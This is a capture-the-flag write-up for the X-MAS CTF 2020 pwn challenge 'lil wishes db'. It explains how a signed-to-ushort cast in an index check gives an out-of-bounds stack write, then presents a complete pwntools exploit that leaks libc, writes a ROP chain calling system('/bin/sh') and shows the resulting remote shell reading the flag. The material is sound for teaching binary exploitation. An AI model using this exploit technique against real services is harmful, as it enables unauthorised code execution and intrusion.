# X-MAS CTF 2020

## lil wishes db

> 359
>
> I don't want a lot for Christmas!  
> RCE is all I need  
> I don't care about protections  
> Underneath the RSP  
>
> Target: `nc challs.xmas.htsp.ro 2002`
> 
> Author: Th3R4nd0m
> 
> [naughty.zip](naughty.zip)

Tags: _pwn_ _x86-64_ _rop_ _remote-shell_ _integer-overflow_ _write-what-where_


## Summary

Leverage integer overflow to write out ROP chain and get a shell.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

All mitigations in place.  Nice!


### Decompile with Ghidra

Just the vulnerable sections of code:

Relevant variables:

```c
  int local_6c;
  int local_68;
  undefined local_58 [72];
```

Swap code:

```c  
        if (local_64 == 1) {
          puts("Index 1:");
          scanf("%d",&local_6c);
          puts("Index 2:");
          scanf("%d",&local_68);
          if ((local_6c < 8) && (local_68 < 8)) {
            swap_ids((ushort)local_6c,(ushort)local_68,(long)local_58);
          }
          else {
            puts("Index should not be > 8");
          }
```

This _swap_ section of code will swap any two 8-byte values in array `local_58` (think of this as `ulong local_58[9]`) with index values 0-7.

There's a perfect storm of minor bugs that result in a major vulnerability--RCE.

`scanf("%d",&local_6c)` and `scanf("%d",&local_68)` permit negative values, this allows the `(local_6c < 8) && (local_68 < 8)` check to pass.  Had `local_6c` and `local_68` been `uint`, this vulnerability would have been mitigated.

The `ushort` casts in the statement `swap_ids((ushort)local_6c,(ushort)local_68,(long)local_58)` converts those negative number to positive creating an integer overflow. This overflow permits swaps with index values 0-65535 (2<sup>16</sup> - 1) enabling arbitrary read and write down stack.

The return address is `0x58` bytes from `local_58`, an index of `11` (`0x58 / 8`) will easily allow us to write out a ROP chain.  


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

def swap(p,n):
    p.sendline('1')
    p.sendlineafter('Index 1:\n','0')
    p.sendlineafter('Index 2:\n',str(n-65536))
    p.recvuntil('Option: \n')

def leak(p,n):
    swap(p,n)
    p.sendline('2')
    p.recvuntil('ID[0] =')
    _ = p.recvline().strip()
    swap(p,n)
    return int(_)

def insert(p,n):
    p.sendline('3')
    p.sendlineafter('Index: \n','0')
    p.sendlineafter('Value: \n',str(n))
    p.recvuntil('Option: \n')

def www(p,what,where):
    insert(p,what)
    swap(p,where)
```

These functions make the exploit development a bit easier:

`swap` just frontends the swap code, however we can just pass in `n` and the `n-65536` will create the necessary negative number to enable an index of range from zero to 65535 (see analysis section).

`leak` will call `swap` to _swap_ a value into the `0`th element and use the programs `Print database` code to leak that value, then call `swap` again to, well, _swap_ it back.

`insert` will only set indexes `0-7` since `local_60` is `uint`, IOW we cannot simply call `insert` to write out our ROP chain.

Lastly, `www` is our _write-what-where_ (limited to down stack), `www` simply writes `what` into the `0`th element using the built-in `Insert ID` code, then calls `swap` once to write it to `where`.

```python
binary = context.binary = ELF('./chall')

if args.REMOTE:
    p = remote('challs.xmas.htsp.ro', 2002)
    libc = ELF('./libc.so.6')
else:
    p = process(binary.path)
    libc = binary.libc

p.recvuntil('Option: \n')

__libc_start_main = leak(p,0x58 // 8) - 231
libc.address = __libc_start_main - libc.sym.__libc_start_main
log.info('libc.address: ' + hex(libc.address))
```

Before we can write out a ROP chain, we need to know the location of `libc`.  Fortunately the game masters provided the challenge server libc binary.  From this with can use `grep` to find that this is from Ubuntu 18.04 and then dev/test in an Ubuntu 18 container (there are other ways, e.g. `p = process([ld.path, binary.path], env={'LD_LIBRARY_PATH': libpath})`, but I had an Ubuntu 18.04 container handy).

Locally, by setting a break point at `ret`:

```
gef➤  b *0x555555554000 + 0xb4a
Breakpoint 1 at 0x555555554b4a
gef➤  run
Starting program: /pwd/datajerk/xmasctf2020/lil_wishes_db/chall
Wishes database

Choose:
1.Swap IDs
2.Print database
3.Insert ID
4.Exit

Option:
4
```

we can see that the return address is:

```
0x00007fffffffe398│+0x0000: 0x00007ffff7a05b97  →  <__libc_start_main+231> mov edi, eax	 ← $rsp
```

Using `leak` with an index of `0x58 // 8` (11) we can get the address of `__libc_start_main+231` and compute the base of libc.

```python
rop = ROP([libc])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

payload = [pop_rdi+1,pop_rdi,libc.search(b'/bin/sh').__next__(),libc.sym.system]

where = 0x58 // 8
for what in payload:
    www(p,what,where)
    where += 1

p.sendline('4')
p.interactive()
```

At this point it's pretty much game over.  All that is required is a `rop rdi` gadget from libc, the location of a `/bin/sh` string and the `system` call, both from libc, and then we just write that down stack starting at `0x58 // 8` (11).

To execute our attack, just send `4` to exit the menu.


Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/xmasctf2020/lil_wishes_db/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to challs.xmas.htsp.ro on port 2002: Done
[*] '/pwd/datajerk/xmasctf2020/lil_wishes_db/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] libc.address: 0x7f813bafc000
[*] Loading gadgets for '/pwd/datajerk/xmasctf2020/lil_wishes_db/libc.so.6'
[*] Switching to interactive mode


Merry Christmas!
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat /home/ctf/flag.txt
X-MAS{oh_nooo_y0u_ru1ned_the_xmas}
```

